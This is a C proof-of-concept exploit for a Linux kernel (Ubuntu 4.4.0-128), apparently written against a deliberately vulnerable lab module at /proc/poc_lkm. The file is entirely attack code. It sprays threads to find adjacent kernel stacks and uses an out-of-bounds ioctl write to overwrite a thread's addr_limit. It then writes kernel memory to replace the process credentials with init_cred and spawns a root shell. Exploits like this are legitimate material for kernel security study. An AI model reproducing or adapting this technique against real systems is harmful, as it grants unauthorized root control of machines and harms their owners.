#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <limits.h>
#include <syscall.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <net/if.h>

/* Ubuntu kernel 4.4.0-128 */

struct poc_lkm_size {
	char dummy[128];
};
struct poc_lkm_input_val {
	int idx;
	unsigned long val;
};

#define POC_LKM_IOCTL_MAGIC ('P')
#define POC_LKM_CMD_0 _IOWR(POC_LKM_IOCTL_MAGIC, 0, struct poc_lkm_size)
#define POC_LKM_CMD_1 _IOWR(POC_LKM_IOCTL_MAGIC, 1, struct poc_lkm_size)
#define POC_LKM_CMD_2 _IOWR(POC_LKM_IOCTL_MAGIC, 2, struct poc_lkm_size)
#define POC_LKM_CMD_3 _IOWR(POC_LKM_IOCTL_MAGIC, 3, struct poc_lkm_size)

int fd;
int buf_offset = 0;
int limit_idx = 0;

unsigned long get_kstack(int offset)
{
	int r, i;
	unsigned char buf[64] = {0,};
	unsigned long addr;

	r = ioctl(fd, POC_LKM_CMD_0, buf);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return 0;
	}

	r = ioctl(fd, POC_LKM_CMD_1, buf);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return 0;
	}

	r = ioctl(fd, POC_LKM_CMD_2, buf);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_2 failed\n");
		return 0;
	}

	addr = *(unsigned long *)(buf + offset);
	return addr & ~0x3fff;
}

#define SDATA_ADDR 0xffffffff81e00000UL

#define KERNEL_DS 0xffffffffffffffffUL
#define KERNEL_DS_HIGH 0xffffffff
#define KERNEL_DS_LOW 0xffffffff
#define USER_DS_LOW 0xfffff000
#define USER_DS_HIGH 0x7fff

#define HIGH_KSTACK_CPUID 2
#define LOW_KSTACK_CPUID 3

void kernel_write(unsigned long addr, char *buf, size_t len)
{
	int pipefds[2];

	if (pipe(pipefds))
		err(1, "pipe");

	if (write(pipefds[1], buf, len) != len)
		errx(1, "pipe write");

	close(pipefds[1]);
	
	if (read(pipefds[0], (char*)addr, len) != len)
		errx(1, "pipe read to kernelspace");

	close(pipefds[0]);
}

void pin_cpu(int cpuid)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpuid, &set);
	if (sched_setaffinity(0, sizeof(cpu_set_t), &set)) {
		printf("sched_setaffinity error\n");
		return;
	}
}

int find_addr_limit_idx(void)
{
	unsigned long arg = 0;
	int idx = 0, sidx = 0, eidx = (0x4000 / 4);
	int r;
	int high_flag = 0;
	struct poc_lkm_input_val input_val = {.idx = 0, .val = 0};

	/* start from adjacent kstack */
	input_val.idx -= (0x4000 / 4);
	pin_cpu(HIGH_KSTACK_CPUID);

	for (sidx=0; sidx<eidx; sidx++) {
		r = ioctl(fd, POC_LKM_CMD_3, &input_val);
		if (r == LOW_KSTACK_CPUID)	{ /* If cpu id hits, */
			input_val.idx+=2;
			r = ioctl(fd, POC_LKM_CMD_3, &input_val);

			/* If set_fs() hasn't called, It must be USER_DS */
			if (r == USER_DS_LOW) {
				input_val.idx++;
				r = ioctl(fd, POC_LKM_CMD_3, &input_val);

				if (r == USER_DS_HIGH) {
					printf("Hit addr_limit : %d\n", input_val.idx - 1);
					return input_val.idx - 1;
				}
				input_val.idx--;
			}
			input_val.idx-=2;
		}

		input_val.idx--;
	}

	return 1; // fail case
}

void overwrite_addr_limit(int idx)
{
	struct poc_lkm_input_val input_val = {.idx = idx, .val = KERNEL_DS};
	ioctl(fd, POC_LKM_CMD_3, &input_val);
}

void print_addr_limit(int idx)
{
	struct poc_lkm_input_val input_val = {.idx = idx, .val = 0};
	int r;

	r = ioctl(fd, POC_LKM_CMD_3, &input_val);
	printf("r1 : %lx\n", r);

	input_val.idx++;
	r = ioctl(fd, POC_LKM_CMD_3, &input_val);
	printf("r2 : %lx\n", r);
}

// global array
#define MAX_KSTACK_ARR 0xfffff
#define NPROC 512

/* key - kstack address,  value - process id */
unsigned long kstack_arr[MAX_KSTACK_ARR] = {0x00,};
unsigned long stack_restore_mask = 0xffff880000000000;
unsigned int kstack_arr_count = 0;

unsigned long get_stack_idx(unsigned long addr)
{
	unsigned long stack_mask = 0x00000000fffff000;
	unsigned long idx;

	idx = addr & stack_mask;
	idx = idx >> 12;
	return idx;
}

unsigned long high_kstack = 0x00;
unsigned long low_kstack = 0x00;
volatile int prog_end_flag = 0;
volatile int attack_ready_flag = 0;
volatile int attack_success_flag = 0;

int pick_adjacent_kstacks(void)
{
	unsigned int i = 0;
	unsigned int kstack_size_off = (16 / 4); /* kernel stack size = 16kb */

	for (i=0; i<MAX_KSTACK_ARR - kstack_size_off; i++) {
		if (kstack_arr[i] != 0x00 && kstack_arr[i+kstack_size_off] != 0x00) {
			printf("find adjacent kstacks!! high : %lx, low : %lx\n", i + kstack_size_off, i);
			high_kstack = i + kstack_size_off;
			low_kstack = i;
			return 0;
		}
	}

	return -1;
}

unsigned long get_task_struct_addr(void)
{
	int idx = limit_idx + 0x1000 - 5;
	struct poc_lkm_input_val input_val = {.idx = idx, .val = 0};
	int r1, r2;
	unsigned long addr;

	r1 = ioctl(fd, POC_LKM_CMD_3, &input_val);

	input_val.idx--;
	r2 = ioctl(fd, POC_LKM_CMD_3, &input_val);

	memcpy(&addr, &r2, sizeof(int));
	memcpy((char *)&addr + 4, &r1, sizeof(int));

	printf("task_struct addr : %lx\n", addr);
	return addr;
}

#define REAL_CRED_OFFSET 0x5f8
#define CRED_OFFSET 0x600
#define INIT_CRED_ADDR 0xffffffff81e50de0UL

void get_root(void)
{
	/* Get task_struct address */
	/* Calculate cred, real_cred address */
	/* Overwrite cred, real_cred with init_cred */
	/* /bin/sh! Get root!! */

	unsigned long task_struct, real_cred, cred;
	unsigned long init_cred = INIT_CRED_ADDR;

	task_struct = get_task_struct_addr();
	real_cred = task_struct + REAL_CRED_OFFSET;
	cred = task_struct + CRED_OFFSET;

	printf("overwrite real_cred, cred!\n");
	kernel_write(real_cred, &init_cred, sizeof(init_cred));
	kernel_write(cred, &init_cred, sizeof(init_cred));
	system("/bin/sh");
}

void *kstack_thread(void *arg)
{
	unsigned long kstack, idx;
	long tid;
	int victim_first = 0;
	int new_val = 0xc2;

	kstack = get_kstack(buf_offset);
	idx = get_stack_idx(kstack);
	tid = syscall(SYS_gettid);
	kstack_arr[idx] = tid;

	while (prog_end_flag == 0) {
		if (high_kstack != 0x00 && low_kstack != 0x00) {
			if (idx == high_kstack) {
				printf("[%ld] I'm the thread to trigger vulnerability!!\n", tid);
				limit_idx = find_addr_limit_idx();
				printf("limit_idx : %d\n", limit_idx);

				attack_ready_flag = 1;
				sleep(4); // wait low kstack thread
				printf("overwrite addr_limit!!\n");
				overwrite_addr_limit(limit_idx);
				sleep(2);
				attack_success_flag = 1;
				break;
			} else if (idx == low_kstack) {
				if (victim_first == 0) {
					printf("[%ld] I'm the victim thread of which addr_limit will be overwritten!!\n", tid);
					pin_cpu(LOW_KSTACK_CPUID);
					victim_first = 1;
				}

				if (attack_ready_flag == 1) {
					printf("Yap! victim is into busy loop!!\n");
					while (attack_success_flag == 0) {
						; // busy loop
					}

					get_root();
					break;
				}
			}
		}
		sleep(1);
	}

	return NULL;
}

int main(int argc, char **argv)
{
	int i, r, pid, status, type;
	pthread_t threads[NPROC];	

	if (argc != 2) {
		printf("USAGE: ./poc <buf offset>\n");
		return 0;
	}

	buf_offset = atoi(argv[1]);

	fd = open("/proc/poc_lkm", O_RDWR);
	if (fd < 0) {
		printf("[-] open /proc/poc_lkm failed\n");
		return 0;
	}

	memset(kstack_arr, 0, sizeof(kstack_arr));
	for (i=0; i<NPROC; i++) {
		r = pthread_create(&threads[i], NULL, kstack_thread, NULL);
		if (r) {
			printf("pthread_create error\n");
			goto out;
		}
	}

	sleep(7);
	r = pick_adjacent_kstacks();
	if (r < 0)
		printf("Can't find adjacent kstacks..\n");
	sleep(3);

	prog_end_flag = 1;
	for (i=0; i<NPROC; i++) {
		r = pthread_join(threads[i], NULL);
		if (r) {
			printf("pthread_join error\n");
		}
	}

out:
	close(fd);
	return 0;
}
